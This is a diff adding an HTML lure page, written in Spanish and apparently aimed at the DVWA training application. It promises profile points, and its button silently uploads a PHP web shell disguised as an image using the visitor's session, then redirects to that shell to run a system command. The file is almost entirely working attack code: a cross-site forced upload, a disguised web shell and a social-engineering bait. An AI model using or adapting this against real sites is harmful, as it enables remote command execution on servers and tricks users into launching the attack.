@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h5>Si quieres ganar puntos para tu perfil presiona el boton de abajo</h5>
+  <button onclick="uploadAndRedirect()">Ganar mas puntos</button>
+
+  <script>
+    function uploadAndRedirect() {
+      // 1. Crear archivo malicioso
+      const shell = new File(
+        ['GIF89a; <?php system($_GET["cmd"]); ?>'],
+        'shell.jpg.php',
+        {type: 'image/jpeg'}
+      );
+
+      // 2. Preparar formulario
+      const form = new FormData();
+      form.append('uploaded', shell);
+      form.append('MAX_FILE_SIZE', '100000');
+      form.append('Upload', 'Upload');
+
+      // 3. Enviar y redirigir
+      fetch('http://localhost/DVWA/vulnerabilities/upload/', {
+        method: 'POST',
+        body: form,
+        credentials: 'include'
+      })
+      // Redirección automática después de 1 segundo
+      window.location.replace('http://localhost/DVWA/hackable/uploads/shell.jpg.php?cmd=echo+noooo+otra+vez+ejecut%C3%A9+una+vulnerabilidad,+sigo+siendo+$(whoami)');
+    }
+  </script>
+</body>
+</html>
